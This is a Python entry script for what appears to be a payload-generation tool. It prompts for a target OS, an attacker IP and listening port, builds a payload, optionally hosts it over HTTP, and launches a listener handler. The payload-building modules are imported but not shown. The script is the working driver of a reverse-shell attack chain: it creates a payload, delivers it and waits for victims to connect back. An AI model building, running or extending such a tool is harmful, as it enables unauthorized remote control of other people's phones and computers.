from core.generator import generate_payload
from core.handler import create_handler, launch_handler
from core.server import host_payload
from utils.banner import show_banner

def main():
    show_banner()
    platform = input("Target OS (android/windows/linux): ").lower()
    lhost = input("LHOST (your IP): ").strip()
    lport = input("LPORT (listening port): ").strip()
    outfile = input("Output file name (no extension): ").strip()

    payload, outformat = generate_payload(platform, lhost, lport, outfile)
    handler_file = create_handler(payload, lhost, lport, outfile)

    if input("Host payload via HTTP? (y/n): ").lower() == "y":
        host_payload(outfile, outformat)

    if input("Start handler? (y/n): ").lower() == "y":
        launch_handler(handler_file)
        
if __name__ == "__main__":
    main()
